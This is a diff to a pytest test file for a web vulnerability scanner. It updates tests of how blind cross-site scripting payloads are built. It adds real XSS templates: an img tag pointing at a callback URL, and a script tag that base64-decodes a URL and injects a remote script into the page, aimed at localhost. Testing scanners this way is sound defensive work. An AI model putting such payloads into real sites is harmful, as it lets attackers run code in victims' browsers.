@@ -2,6 +2,7 @@ import pytest
 import logging
 import sys
 import re
+import base64
 import ava.scanner
 import ava.common.config
 import ava.common.utility
@@ -187,15 +188,18 @@ def test_modify_payloads_positive():
 
     # set payloads blinds
     checks = [CrossSiteScriptingBlindDirectCheck("http://localhost:8080/")]
-    values = {'xss.blind.direct': ["payload"]}
+    values = {'xss.blind.direct': ["<img src='{}'>"]}
     test = ava.scanner._modify_payloads(checks, values, True)
-    assert test[0]._payloads == ["payload"]
+    assert test[0]._payloads == ["<img src='http://localhost:8080/'>"]
 
     # add payloads blinds
     checks = [CrossSiteScriptingBlindDirectCheck("http://localhost:8080/")]
-    values = {'xss.blind.dynamic': ["payload"]}
+    values = {'xss.blind.dynamic': ["<script>{}</script>"]}
     correct = checks[0]._payloads
-    correct.append("payload")
+    template = "s=document.createElement('script');s.src=atob('{}');document.head.appendChild(s);"
+    encoded = base64.b64encode("http://localhost:8080/".encode()).decode()
+    script = template.format(encoded)
+    correct.append("<script>{}</script>".format(script))
     test = ava.scanner._modify_payloads(checks, values, False)
     assert test[0]._payloads == correct
 
